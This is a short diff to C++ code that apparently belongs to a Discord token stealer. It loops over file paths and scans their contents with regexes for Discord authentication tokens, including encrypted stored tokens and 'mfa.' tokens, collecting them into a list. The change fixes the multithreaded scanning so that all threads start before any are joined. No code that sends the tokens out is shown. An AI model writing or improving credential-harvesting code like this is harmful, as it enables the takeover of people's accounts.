@@ -54,7 +54,7 @@ public:
         int index = 0;
         for (const std::pair<std::string, std::string> &_pair : path_list) {
 
-             std::vector<std::string> encrypted_token_list;
+            std::vector<std::string> encrypted_token_list;
 
             std::vector<std::regex> regex_list;
             regex_list.emplace_back(R"(dQw4w9WgXcQ:[^\"\[\]\(\)]*)");
@@ -64,7 +64,6 @@ public:
             regex_list.emplace_back(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
             regex_list.emplace_back(R"(mfa\.[\w-]{84})");
 
-            std::vector<std::thread> thread_list;
             std::mutex mtx;
 
             std::vector<std::string> contents;
@@ -81,8 +80,10 @@ public:
                 }
             }
 
+            std::vector<std::thread> thread_list;
+
             for (std::string &content : contents) {
-                std::thread _thread([&]() {
+                thread_list.emplace_back([&]() {
                     for (std::regex r : regex_list) {
 
                         std::sregex_iterator begin(content.begin(), content.end(), r);
@@ -99,7 +100,9 @@ public:
                         encrypted_token_list.insert(encrypted_token_list.end(), local_list.begin(), local_list.end());
                     }
                 });
+            }
 
+            for (std::thread &_thread : thread_list) {
                 if (_thread.joinable()) {
                     _thread.join();
                 }
